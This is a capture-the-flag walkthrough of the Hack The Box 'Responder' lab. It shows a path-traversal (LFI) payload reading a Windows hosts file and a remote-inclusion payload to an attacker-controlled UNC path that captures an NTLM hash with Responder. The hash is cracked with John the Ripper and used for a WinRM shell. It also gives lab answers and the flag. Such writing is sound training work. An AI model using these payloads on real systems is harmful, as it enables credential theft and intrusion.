---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Responder

## <mark style="color:blue;">Description</mark>

* **Tier **<mark style="color:green;">**->**</mark>** 1**
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **Tags **<mark style="color:green;">**->**</mark> WinRM / Custom Applications / Protocols / XAMPP / SMB / Responder / PHP\
  &#x20;             Reconnaissance / Password Cracking / Hash Capture / Remote File Inclusion\
  &#x20;             Remote Code Execution

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=1</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* We start doing an initial scan

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap -p- -Pn --min-rate 2000 10.129.215.213
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

***

* Now we can make an exhaustive scan

<pre class="language-bash" data-line-numbers><code class="lang-bash"><strong>nmap -p80 -sVC 10.129.215.213
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

***

* As it is an HTTP on port 80, it means is a web page, so we can go and check it on the browser. It redirects us to a domain named _unika.htb,_ but we are unable to reach the server.

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>



***

* With this, we can answer the first question

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

> Answer: _**unika.htb**_

***

* The reason why the page doesn't show us content is because isn't in our list of known hosts. To fix this we will add it by modifying the _/etc/hosts_ file

{% code lineNumbers="true" %}
```bash
sudo nano /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

***

* Now we can reload the page and it will work properly

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

***

* We can get some information about the page technologies from the _Wappalyzer_ extension

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

***

* With this, we can answer the next question

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

> Answer: _**php**_

***

* As we navigate through the page we find in the top right corner a slider to select the language of the page

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

***

* If we select one different from _english_, the language of the page will change and the URL will show some parameters reflecting this action

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

***

* Then we can answer the next question

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

> Answer: _**page**_



***

* Now we can abuse these parameters to make an LFI attack to list the contents of the server. The attempt is successful and gives us the content of the asked file. Note that we use a payload for a Windows server because _Wappalyzer_ told us this information.

{% code title="Payload" lineNumbers="true" %}
```url
page=../../../../../../../../windows/system32/drivers/etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

***

* With  this and some research, we can answer some questions

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

> Answer: ../../../../../../../../windows/system32/drivers/etc/hosts

***

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

> Answer: _**//10.10.14.6/somefile**_

***

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

> Answer: _**New Technology Lan Manager**_

***

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

> Answer: _**-I**_

***

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

> Answer: _**John The Ripper**_

***

* Now we will use the _responder_ utility to get the credentials of the target. First, we need to configure the tool, so we modify the _Responder.config_ file to set the value of _SMB_ to _On_.

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nano /usr/share/responder/Responder.conf
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

***

* With this set, we initialize the tool specifying the network interface we are using

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption><p>Snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
We can check the interface using the`ifconfig` command. Normally will be _tun0_ as this is the network interface of the VPN we are connected to.
{% endhint %}

***

* With this, we can go to the vulnerable parameter of the URL and make an RFL to our machine to get the credentials.

{% code title="Payload" overflow="wrap" lineNumbers="true" %}
```url
page=//10.10.14.195/somefile
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

***

* As seen above, the page displays an error but if we check the _responder_ running service it has caught the credentials of the target.

<figure><img src="../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

***

* The most important part is the hash we have obtained, so we save it in a text file.

<figure><img src="../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

***

* Now we can try to break the hash using the _John The Ripper_ tool, for this, we use the well-known _rouckyou.txt_ dictionary. We see that the cracking process was successful and we have got the password _badminton_ for the user _Administrator_

<figure><img src="../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

***

* With this and some research, we can answer some questions

<figure><img src="../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

> Answer:  _**badminton**_

***

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

> Answer: _**5985**_

***

* With these credentials, we can use the _evil-winrm_ tool to connect  to a shell of the Windows machine

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

***

* If we search through the system, we will find a file called _flag.txt_ in the _C:\Users\mike\Desktop_ folder

<figure><img src="../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

***

* Finally, we can check the content of the file with `type flag.txt` and exit from the Windows system

<figure><img src="../../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

***

* With this, we have got the root flag and have pawned the machine.

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ea81b7afddd03efaa0945333ed147fac**_
